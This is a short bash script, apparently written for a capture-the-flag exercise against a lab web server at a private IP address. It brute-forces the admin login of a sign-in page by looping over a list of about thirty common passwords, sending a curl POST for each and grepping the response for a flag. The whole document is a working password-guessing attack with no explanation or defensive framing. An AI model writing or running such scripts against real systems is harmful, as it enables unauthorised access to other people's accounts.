#!/bin/bash

password=( letmein photoshop shadow sunshine princess 000000 trustno1 monkey 123456 password 123456789 12345678 12345 111111 1234567 qwerty iloveyou princess admin welcome 666666 abc123 football 123123 monkey 654321 charlie aa123456 donald password1 qwerty123 )

for i in ${password[@]}; do
    curl -X POST "http://192.168.208.128/?page=signin&username=admin&password=${i}&Login=Login#" | grep flag
done